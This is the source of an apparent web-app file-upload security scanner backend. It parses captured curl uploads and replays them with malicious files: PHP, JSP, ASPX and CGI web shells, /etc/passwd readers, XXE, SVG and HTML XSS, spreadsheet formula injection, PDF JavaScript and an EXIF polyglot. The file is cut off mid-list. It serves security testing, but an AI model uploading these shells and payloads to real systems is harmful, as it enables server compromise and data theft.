"""
File Upload Security Tester Backend — Port 8776

Parses a multipart-upload curl (Browser DevTools / Postman / curl -F), then
replays it with a battery of malicious test files to detect unrestricted file
upload, MIME/extension bypass, path traversal, null-byte, EXIF polyglot,
SVG/HTML/CSV/PDF/Excel(OOXML) XSS, and content-based redirect/SSRF payloads.

Infers expected file family from the original curl (e.g. .xlsx → excel) so
baselines and attacks match what the target actually accepts.

Phases run in a background thread; the UI polls /upload/progress/{job}.
"""

import re, os, csv, time, uuid, json, struct, io, zipfile, threading
from urllib.parse import urlparse
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import urllib3

try:
    import requests as req_lib
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    req_lib = None

app = FastAPI(title="File Upload Tester Backend")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

TIMEOUT      = 15
VERIFY_SSL   = False
DELAY        = 0.25          # polite gap between uploads
MAX_RESP     = 3000          # response snippet length kept per probe
REDIRECT_URL = "https://example.com"   # neutral canary for content-redirect payloads

jobs = {}   # job_id → job dict


# ═══════════════════════════════ CURL PARSER ═══════════════════════════════ #

def parse_curl(curl: str):
    """Parse a multipart-upload curl string.
    Returns (url, headers, cookies, form_fields, file_param). Raises ValueError.

    Uses the shared AV-grade tokenizer for -F / --url / -H / -b / --json etc.,
    then falls back to DevTools multipart --data-raw body extraction.
    """
    url, headers, cookies = None, {}, {}
    form_fields, file_param = [], None

    # ── Prefer shared parser (handles -F, --url, clustered flags, quoting) ──
    try:
        try:
            from curl_parser import parse_curl_command
            d = parse_curl_command(curl)
        except ImportError:
            import importlib.util
            _here = os.path.dirname(os.path.abspath(__file__))
            _p = os.path.join(_here, "curl_parser.py")
            if not os.path.isfile(_p):
                _p = os.path.join(os.path.dirname(_here), "curl_parser.py")
            _spec = importlib.util.spec_from_file_location("_up_curl_parser", _p)
            _mod = importlib.util.module_from_spec(_spec)
            _spec.loader.exec_module(_mod)
            d = _mod.parse_curl_command(curl)
        url = d.get("url") or None
        headers = dict(d.get("headers") or {})
        cookies = dict(d.get("cookies") or {})
        method = d.get("method") or "POST"
        for part in (d.get("form_parts") or []):
            key = part.get("key")
            if not key:
                continue
            if part.get("is_file"):
                form_fields.append({
                    "key": key, "value": None, "is_file": True,
                    "orig_name": part.get("filename") or part.get("value") or "file",
                    "mime": part.get("content_type"),
                })
                if file_param is None:
                    file_param = key
            else:
                form_fields.append({
                    "key": key, "value": part.get("value"), "is_file": False,
                    "orig_name": None, "mime": part.get("content_type"),
                    "is_json": part.get("is_json", False),
                })
    except Exception:
        # Fall through to legacy regex path for URL/headers if shared parse fails
        d = None

    # ── Legacy URL extraction if shared missed it ────────────────────────────
    if not url:
        for pat in (
            r"""--url\s+'([^']+)'""",
            r'''--url\s+"([^"]+)"''',
            r"""--url='([^']+)'""",
            r'''--url="([^"]+)"''',
            r"--url=(\S+)",
            r"--url\s+(https?://\S+)",
            r"curl(?:\s+(?:--location(?:-trusted)?|--compressed|--insecure|-k|-L|--request\s+\w+|-X\s*\w+|--url))*\s+'([^']+)'",
            r'curl(?:\s+(?:--location(?:-trusted)?|--compressed|--insecure|-k|-L|--request\s+\w+|-X\s*\w+|--url))*\s+"([^"]+)"',
            r"curl(?:\s+(?:--location(?:-trusted)?|--compressed|--insecure|-k|-L|--request\s+\w+|-X\s*\w+|--url))*\s+(https?://\S+)",
        ):
            m = re.search(pat, curl)
            if m:
                url = m.group(1).rstrip("\\").strip()
                if url:
                    break
    if not url:
        raise ValueError("No URL found in the curl command.")

    # Legacy header/cookie fill only when shared didn't populate
    if not headers:
        for pat in (r'(?:-H|--header)\s+\'([^\']+)\'',
                    r'(?:-H|--header)\s+"((?:[^"\\]|\\.)+)"'):
            for h in re.findall(pat, curl):
                h = h.replace('\\"', '"')
                if ":" not in h:
                    continue
                k, v = h.split(":", 1); k, v = k.strip(), v.strip()
                if k.lower() == "cookie":
                    for ck in v.split(";"):
                        ck = ck.strip()
                        if "=" in ck:
                            a, b = ck.split("=", 1); cookies[a.strip()] = b.strip()
                elif k not in headers:
                    headers[k] = v
        for cb in re.findall(r"(?:-b|--cookie)\s+'([^']*)'", curl):
            for ck in cb.split(";"):
                ck = ck.strip()
                if "=" in ck:
                    a, b = ck.split("=", 1); cookies[a.strip()] = b.strip()

    # Legacy -F regex if shared found no form parts
    if not form_fields:
        f_flags  = re.findall(r"(?:-F|--form)\s+'([^']+)'", curl)
        f_flags += [v.replace('\\"', '"')
                    for v in re.findall(r'(?:-F|--form)\s+"((?:[^"\\]|\\.)+)"', curl)]
        if f_flags:
            for raw in f_flags:
                if "=" not in raw:
                    continue
                key, val = raw.split("=", 1); key = key.strip()
                if val.startswith("@"):
                    fp2 = val[1:].strip(); mime = None
                    pm = re.match(r'^"([^"]+)"(?:;type=(.+))?$', fp2)
                    if pm:
                        fp2  = pm.group(1).strip()
                        mime = (pm.group(2) or "").strip().strip('"') or None
                    elif ";type=" in fp2:
                        fp2, mime = fp2.split(";type=", 1); mime = mime.strip()
                    form_fields.append({"key": key, "value": None, "is_file": True,
                                        "orig_name": os.path.basename(fp2), "mime": mime})
                    if file_param is None:
                        file_param = key
                else:
                    clean = val
                    if clean.startswith('"') and clean.endswith('"'):
                        clean = clean[1:-1]
                    form_fields.append({"key": key, "value": clean, "is_file": False,
                                        "orig_name": None, "mime": None})

    # ── Mode A: DevTools / Postman --data-raw / --data-binary multipart ───────
    if not form_fields:
        body = _extract_curl_body(curl)
        if body is not None:
            ct = _header_get(headers, "content-type")
            form_fields, file_param = _parse_multipart_fields(body, ct)

    # ── Mode A2: last-resort — scan whole curl text for Content-Disposition ──
    if not form_fields:
        form_fields, file_param = _parse_multipart_fields(curl, _header_get(headers, "content-type"))

    if not form_fields:
        raise ValueError("No multipart form fields found. Provide a curl with -F / "
                         "--form or a DevTools --data-raw / --data-binary multipart body.")
    if file_param is None:
        raise ValueError("No file field (@file) found in the curl.")
    if 'method' not in locals() or not method:
        m_meth = re.search(r"(?:-X|--request)\s+['\"]?([A-Za-z]+)['\"]?", curl)
        method = m_meth.group(1).upper() if m_meth else "POST"
    return url, headers, cookies, form_fields, file_param, method


def _parse_multipart_fields(text: str, content_type: str = ""):
    """Parse multipart parts → (form_fields, file_param). Tolerates empty/truncated bodies."""
    form_fields, file_param = [], None
    if not text:
        return form_fields, file_param

    bnd = _multipart_boundary(content_type, text)
    parts = []
    if bnd:
        splitter = re.compile(
            r"(?:\r?\n)?--" + re.escape(bnd) + r"(?:--)?(?:\r?\n)?"
        )
        parts = [p for p in splitter.split(text) if p and p.strip() and p.strip() != "--"]
    else:
        parts = [text]

    for part in parts:
        part = part.strip("\r\n")
        if not part:
            continue
        if "\r\n\r\n" in part:
            ph, pb = part.split("\r\n\r\n", 1)
        elif "\n\n" in part:
            ph, pb = part.split("\n\n", 1)
        else:
            # Truncated paste / empty file — headers only, no blank line before next boundary
            ph, pb = part, ""

        cd = re.search(
            r'Content-Disposition:\s*form-data;\s*name="([^"]+)"'
            r'(?:;\s*filename="([^"]*)")?', ph, re.I)
        if not cd:
            cd = re.search(
                r"Content-Disposition:\s*form-data;\s*name='([^']+)'"
                r"(?:;\s*filename='([^']*)')?", ph, re.I)
        if not cd:
            continue
        fn, fv = cd.group(1), cd.group(2)

        pct = re.search(r"Content-Type:\s*(\S+)", ph, re.I)
        pmime = pct.group(1).strip(";") if pct else None
        pb = re.sub(r'[\r\n]*-{2,}[^\r\n]*$', '', pb or "").rstrip("\r\n")

        # Deduplicate by key+filename
        if any(f["key"] == fn and f.get("orig_name") == fv for f in form_fields):
            continue

        if fv is not None:
            form_fields.append({"key": fn, "value": None, "is_file": True,
                                "orig_name": fv,
                                "mime": pmime or "application/octet-stream"})
            if file_param is None:
                file_param = fn
        else:
            val_pb = pb.strip()
            if (val_pb.startswith('"') and val_pb.endswith('"')) or (val_pb.startswith("'") and val_pb.endswith("'")):
                if val_pb.startswith('"'):
                    try:
                        unq = json.loads(val_pb)
                        if isinstance(unq, (str, dict, list)):
                            val_pb = unq if isinstance(unq, str) else json.dumps(unq)
                    except Exception:
                        inner = val_pb[1:-1]
                        val_pb = inner.replace(r'\"', '"') if r'\"' in inner else inner
                else:
                    inner = val_pb[1:-1]
                    val_pb = inner.replace(r"\'", "'") if r"\'" in inner else inner
            is_json_pb = False
            try:
                p_json = json.loads(val_pb)
                if isinstance(p_json, (dict, list)):
                    is_json_pb = True
                    if not pmime:
                        pmime = "application/json"
            except Exception:
                pass
            form_fields.append({"key": fn, "value": val_pb, "is_file": False,
                                "orig_name": None, "mime": pmime, "is_json": is_json_pb})

    # Ultra-fallback: global regex over text (even if boundary split failed)
    if not form_fields:
        for m in re.finditer(
            r'Content-Disposition:\s*form-data;\s*name="([^"]+)"'
            r'(?:;\s*filename="([^"]*)")?',
            text, re.I,
        ):
            fn, fv = m.group(1), m.group(2)
            # Peek nearby for content-type
            tail = text[m.end():m.end() + 200]
            pct = re.search(r"Content-Type:\s*(\S+)", tail, re.I)
            pmime = pct.group(1).strip(";") if pct else None
            if fv is not None:
                form_fields.append({"key": fn, "value": None, "is_file": True,
                                    "orig_name": fv,
                                    "mime": pmime or "application/octet-stream"})
                if file_param is None:
                    file_param = fn
            else:
                form_fields.append({"key": fn, "value": "", "is_file": False,
                                    "orig_name": None, "mime": None})

    return form_fields, file_param


def _header_get(headers: dict, name: str) -> str:
    nl = name.lower()
    for k, v in headers.items():
        if k.lower() == nl:
            return v or ""
    return ""


def _decode_ansi_c_body(raw: str) -> str:
    """Decode bash $'...' escapes used by Chrome DevTools Copy as cURL."""
    out, i, n = [], 0, len(raw)
    while i < n:
        c = raw[i]
        if c != "\\" or i + 1 >= n:
            out.append(c); i += 1; continue
        nxt = raw[i + 1]
        if nxt == "n":
            out.append("\n"); i += 2
        elif nxt == "r":
            out.append("\r"); i += 2
        elif nxt == "t":
            out.append("\t"); i += 2
        elif nxt == "\\" or nxt == "'" or nxt == '"':
            out.append(nxt); i += 2
        elif nxt == "x" and i + 3 < n:
            try:
                out.append(chr(int(raw[i + 2:i + 4], 16))); i += 4
            except ValueError:
                out.append(c); i += 1
        elif nxt in "01234567":
            j, val = i + 1, 0
            while j < n and j < i + 4 and raw[j] in "01234567":
                val = val * 8 + int(raw[j]); j += 1
            out.append(chr(val & 0xFF)); i = j
        else:
            out.append(nxt); i += 2
    return "".join(out)


def _extract_curl_body(curl: str):
    """Pull multipart body from --data-raw / --data-binary / -d / --data."""
    flag_re = re.compile(
        r"(?:--data-raw|--data-binary|--data)(?:\s+|=)|(?:\s-d\s+)", re.I
    )
    for m in flag_re.finditer(curl):
        rest = curl[m.end():]
        # Skip line-continuation whitespace
        rest_l = rest.lstrip(" \t")
        # Chrome sometimes puts opening quote on next line after \
        if rest_l.startswith("\\\n") or rest_l.startswith("\\\r\n"):
            rest_l = rest_l.split("\n", 1)[-1].lstrip()
        rest = rest_l

        # $'...' ANSI-C quoting (Chrome bash)
        if rest.startswith("$'"):
            i = 2
            buf = []
            while i < len(rest):
                if rest[i] == "\\" and i + 1 < len(rest):
                    buf.append(rest[i:i + 2]); i += 2; continue
                if rest[i] == "'":
                    return _decode_ansi_c_body("".join(buf))
                buf.append(rest[i]); i += 1
            # Unclosed $'...' — still return what we have (truncated paste)
            if buf:
                return _decode_ansi_c_body("".join(buf))
            continue
        # "..." double quotes
        if rest.startswith('"'):
            dm = re.match(r'"((?:[^"\\]|\\.)*)"', rest, re.DOTALL)
            if dm:
                return (dm.group(1)
                        .replace('\\r\\n', '\r\n').replace('\\n', '\n')
                        .replace('\\r', '\r').replace('\\"', '"')
                        .replace('\\\\', '\\'))
            # Unclosed "
            return (rest[1:]
                    .replace('\\r\\n', '\r\n').replace('\\n', '\n')
                    .replace('\\r', '\r').replace('\\"', '"'))
        # '...' single quotes
        if rest.startswith("'"):
            dm = re.match(r"'([^']*)'", rest, re.DOTALL)
            if dm:
                return dm.group(1)
            # Unclosed ' — take rest (common when binary paste breaks quotes)
            return rest[1:]
        # Unquoted body starting with multipart boundary
        if re.match(r"(?:\\[rn]|[\r\n])*--+", rest):
            end = re.search(r"(?:\s+-[A-Za-z]|\s+--[a-z-]|\s*$)", rest)
            chunk = rest[:end.start()] if end else rest
            return (chunk.replace('\\r\\n', '\r\n').replace('\\n', '\n')
                    .replace('\\r', '\r'))
    return None


def _multipart_boundary(content_type: str, body: str):
    """Boundary from Content-Type header, else infer from body delimiters."""
    bm = re.search(r'boundary=("?)([^";\s]+)\1', content_type or "", re.I)
    if bm:
        return bm.group(2)
    # Body lines look like: --BOUNDARY or --BOUNDARY--
    m = re.search(r"(?:^|[\r\n])--([^\r\n]+?)(?:--)?(?:\r|\n|$)", body or "")
    if not m:
        return None
    bnd = m.group(1).strip()
    if bnd.endswith("--"):
        bnd = bnd[:-2]
    return bnd or None


# ════════════════════════════ PAYLOADS & MAGIC BYTES ══════════════════════ #

PHP_SECRET = b"<?php echo file_get_contents('/etc/passwd'); ?>"
PHP_SYSTEM = b"<?php system($_GET['cmd']); ?>"
JSP_SHELL  = b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
ASPX_SHELL = b'<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe"); %>'

JPEG = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9"
PNG  = (b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"
        b"\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00"
        b"\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82")
GIF  = b"GIF89a\x01\x00\x01\x00\x80\xff\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
PDF  = b"%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\n%%EOF"
WEBP = b"RIFF\x24\x00\x00\x00WEBPVP8 "
ZIP  = b"PK\x03\x04"

XLSX_MIME = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
XLS_MIME  = "application/vnd.ms-excel"

# Minimal OLE Compound File header — enough for "looks like .xls" probes (not a full BIFF workbook).
XLS_OLE_STUB = (
    b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 24
    + b"\x3e\x00" + b"\x03\x00" + b"\xfe\xff" + b"\x09\x00"
    + b"\x06\x00" + b"\x00\x00" + b"\x00" * 468
)


def make_minimal_xlsx(cells_xml=None) -> bytes:
    """Build a minimal valid .xlsx (OOXML ZIP) that real Excel/OOXML parsers accept."""
    if cells_xml is None:
        cells_xml = (
            '<c r="A1" t="inlineStr"><is><t>API Sentinel</t></is></c>'
            '<c r="B1" t="inlineStr"><is><t>ok</t></is></c>'
        )
    content_types = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Override PartName="/xl/workbook.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
        '<Override PartName="/xl/worksheets/sheet1.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>'
        '</Types>'
    )
    rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
        'Target="xl/workbook.xml"/>'
        '</Relationships>'
    )
    workbook = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
        'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
        '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>'
        '</workbook>'
    )
    wb_rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" '
        'Target="worksheets/sheet1.xml"/>'
        '</Relationships>'
    )
    sheet = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
        f'<sheetData><row r="1">{cells_xml}</row></sheetData>'
        '</worksheet>'
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", content_types)
        zf.writestr("_rels/.rels", rels)
        zf.writestr("xl/workbook.xml", workbook)
        zf.writestr("xl/_rels/workbook.xml.rels", wb_rels)
        zf.writestr("xl/worksheets/sheet1.xml", sheet)
    return buf.getvalue()


def make_xlsx_with_extra(extra_name: str, extra_data: bytes, cells_xml=None) -> bytes:
    """Valid xlsx ZIP plus an extra entry (polyglot / zip-slip style probes)."""
    base = make_minimal_xlsx(cells_xml)
    buf = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(base), "r") as src, \
         zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as dst:
        for info in src.infolist():
            dst.writestr(info, src.read(info.filename))
        dst.writestr(extra_name, extra_data)
    return buf.getvalue()


def make_xlsx_with_declared_extra(extra_name: str, extra_data: bytes,
                                  part_ct: str = "application/octet-stream") -> bytes:
    """OOXML + extra part that IS listed in [Content_Types].xml (avoids POI M.1.14)."""
    base = make_minimal_xlsx()
    part = extra_name if extra_name.startswith("/") else "/" + extra_name
    buf = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(base), "r") as src, \
         zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as dst:
        for info in src.infolist():
            data = src.read(info.filename)
            if info.filename == "[Content_Types].xml":
                inject = (f'<Override PartName="{part}" ContentType="{part_ct}"/>'
                          f'</Types>')
                data = data.replace(b"</Types>", inject.encode())
            dst.writestr(info, data)
        dst.writestr(extra_name.lstrip("/"), extra_data)
    return buf.getvalue()


def make_minimal_docx() -> bytes:
    """Minimal valid Word OOXML (.docx)."""
    ct = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Override PartName="/word/document.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
        '</Types>'
    )
    rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
        'Target="word/document.xml"/>'
        '</Relationships>'
    )
    doc = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        '<w:body><w:p><w:r><w:t>API Sentinel</w:t></w:r></w:p></w:body>'
        '</w:document>'
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", ct)
        zf.writestr("_rels/.rels", rels)
        zf.writestr("word/document.xml", doc)
    return buf.getvalue()


def make_docx_xxe() -> bytes:
    """DOCX whose document.xml contains an XXE payload."""
    base = make_minimal_docx()
    xxe_doc = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        '<w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>'
        '</w:document>'
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(base), "r") as src, \
         zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as dst:
        for info in src.infolist():
            if info.filename == "word/document.xml":
                dst.writestr(info, xxe_doc)
            else:
                dst.writestr(info, src.read(info.filename))
    return buf.getvalue()


def make_minimal_pptx() -> bytes:
    """Minimal valid PowerPoint OOXML (.pptx)."""
    ct = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Override PartName="/ppt/presentation.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"/>'
        '<Override PartName="/ppt/slides/slide1.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>'
        '</Types>'
    )
    rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
        'Target="ppt/presentation.xml"/>'
        '</Relationships>'
    )
    pres = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" '
        'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
        '<p:sldIdLst><p:sldId id="256" r:id="rId1"/></p:sldIdLst>'
        '</p:presentation>'
    )
    pres_rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" '
        'Target="slides/slide1.xml"/>'
        '</Relationships>'
    )
    slide = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">'
        '<p:cSld><p:spTree><p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/>'
        '</p:nvGrpSpPr><p:grpSpPr/></p:spTree></p:cSld></p:sld>'
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", ct)
        zf.writestr("_rels/.rels", rels)
        zf.writestr("ppt/presentation.xml", pres)
        zf.writestr("ppt/_rels/presentation.xml.rels", pres_rels)
        zf.writestr("ppt/slides/slide1.xml", slide)
    return buf.getvalue()


def make_valid_zip(entries=None) -> bytes:
    """Simple ZIP with harmless text files (baseline for zip-only APIs)."""
    entries = entries or [("readme.txt", b"API Sentinel zip baseline\n")]
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, data in entries:
            zf.writestr(name, data)
    return buf.getvalue()


def _ooxml_plus_shell(base: bytes, shell_name: str = "exploit.php",
                      shell: bytes = None) -> bytes:
    shell = shell if shell is not None else PHP_SECRET
    buf = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(base), "r") as src, \
         zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as dst:
        for info in src.infolist():
            dst.writestr(info, src.read(info.filename))
        dst.writestr(shell_name, shell)
    return buf.getvalue()


VALID_XLSX = make_minimal_xlsx()
VALID_DOCX = make_minimal_docx()
VALID_PPTX = make_minimal_pptx()
VALID_ZIP  = make_valid_zip()
DOCX_MIME = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
PPTX_MIME = "application/vnd.openxmlformats-officedocument.presentationml.presentation"
ZIP_MIME  = "application/zip"
XLSX_FORMULA = make_minimal_xlsx(
    '<c r="A1"><f>HYPERLINK("https://example.com","click")</f><v>0</v></c>'
    '<c r="A2" t="inlineStr"><is><t>=cmd|"/C calc"!A0</t></is></c>'
)
XLSX_EXTERNAL_LINK = make_minimal_xlsx(
    '<c r="A1"><f>WEBSERVICE("https://example.com/ping")</f><v>0</v></c>'
)
XLSX_SHELL_DECLARED = make_xlsx_with_declared_extra(
    "exploit.php", PHP_SECRET, "application/x-php"
)
DOCX_XXE = make_docx_xxe()

# EICAR antivirus test string (harmless; triggers AV)
EICAR = (
    b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
)
SSI_SHELL = b'<!--#exec cmd="id" --><!--#include virtual="/etc/passwd" -->'
SVG_XXE = (
    b'<?xml version="1.0"?>'
    b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    b'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
)
ASP_SHELL = b'<% Response.Write(CreateObject("WScript.Shell").Exec("cmd /c whoami").StdOut.ReadAll()) %>'
CFM_SHELL = b'<cfexecute name="id" outputfile="/tmp/out.txt" timeout="5"></cfexecute>'
PY_SHELL  = b'#!/usr/bin/env python3\nimport os;os.system("id")\n'
SH_SHELL  = b'#!/bin/sh\nid\ncat /etc/passwd\n'
CGI_SHELL = b'#!/bin/bash\necho "Content-Type: text/plain"\necho\nid\n'

SVG_VARIANTS = {
    "onload_alert" : b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><rect width="1" height="1"/></svg>',
    "script_tag"   : b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script><rect width="1" height="1"/></svg>',
    "animate_begin": b'<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(1)" attributeName="x" dur="1s"/></svg>',
    "img_onerror"  : b'<svg xmlns="http://www.w3.org/2000/svg"><image href="x" onerror="alert(1)"/></svg>',
    "foreignobject": b'<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100" height="100"><iframe src="javascript:alert(1)"/></foreignObject></svg>',
}

HTML_XSS    = b"<html><head><title>XSS</title></head><body><script>alert(document.domain)</script></body></html>"
XML_XXE     = b'<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
CSV_FORMULA = b'=cmd|"/C calc"!A0\n@SUM(1+1)*cmd|"/C calc"!A0\n=HYPERLINK("https://example.com","click")'
PDF_JS      = b'%PDF-1.4\n1 0 obj<</Type/Catalog/OpenAction<</Type/Action/S/JavaScript/JS(app.alert("XSS"))>>>>endobj\nxref\n0 0\ntrailer<</Root 1 0 R>>\n%%EOF'


def make_exif_polyglot(php: bytes) -> bytes:
    """JPEG that passes image validation but hides PHP in the 0xFFFE comment marker."""
    marker = b"\xff\xfe" + struct.pack(">H", len(php) + 2) + php
    return b"\xff\xd8" + marker + JPEG[2:]


# ── Content-based redirect / SSRF / XSS payloads (from '1 and 2.txt') ───────
# Templates use the @@URL@@ token (substituted via .replace) so literal % and
# {} characters in PDF/JSON payloads can't break string formatting.
_U = "@@URL@@"

def _b(template: str) -> bytes:
    return template.replace(_U, REDIRECT_URL).encode()

REDIRECT_FILES = [
    ("redir_openaction.pdf", _b(
        "%PDF-1.1\n1 0 obj\n<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R>>\nendobj\n"
        "2 0 obj\n<</Type/Pages/Count 1/Kids[4 0 R]>>\nendobj\n"
        "3 0 obj\n<</Type/Action/S/URI/URI(" + _U + ")>>\nendobj\n"
        "4 0 obj\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>\nendobj\n"
        "trailer\n<</Size 5/Root 1 0 R>>\n%%EOF"),
     "application/pdf", "PDF OpenAction URI auto-redirect on open"),
    ("redir_pdf_js.pdf", _b(
        "%PDF-1.4\n1 0 obj<</Type/Catalog/OpenAction<</S/JavaScript"
        "/JS(app.launchURL(\"" + _U + "\",true);)>>>>endobj\n%%EOF"),
     "application/pdf", "PDF JavaScript app.launchURL redirect (Adobe)"),
    ("redir_meta.html", _b(
        '<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=' + _U + '"></head>'
        '<body><script>window.location.replace("' + _U + '")</script></body></html>'),
     "text/html", "HTML meta-refresh + JS redirect"),
    ("redir_iframe.html", _b(
        '<!DOCTYPE html><html><body style="margin:0">'
        '<iframe src="' + _U + '" style="width:100%;height:100%;border:none"></iframe>'
        '<script>top.location="' + _U + '"</script></body></html>'),
     "text/html", "HTML full-page iframe + top.location redirect"),
    ("redir_svg.svg", _b(
        '<svg xmlns="http://www.w3.org/2000/svg" onload="window.location=\'' + _U + '\'">'
        '<rect width="100" height="100" fill="white"/></svg>'),
     "image/svg+xml", "SVG onload window.location redirect"),
    ("redir_xslt.xml", _b(
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">'
        '<xsl:template match="/"><html><head>'
        '<meta http-equiv="refresh" content="0;url=' + _U + '"/></head></html>'
        '</xsl:template></xsl:stylesheet>'),
     "application/xml", "XML/XSLT server-side redirect"),
    ("redir_office.rels.xml", _b(
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
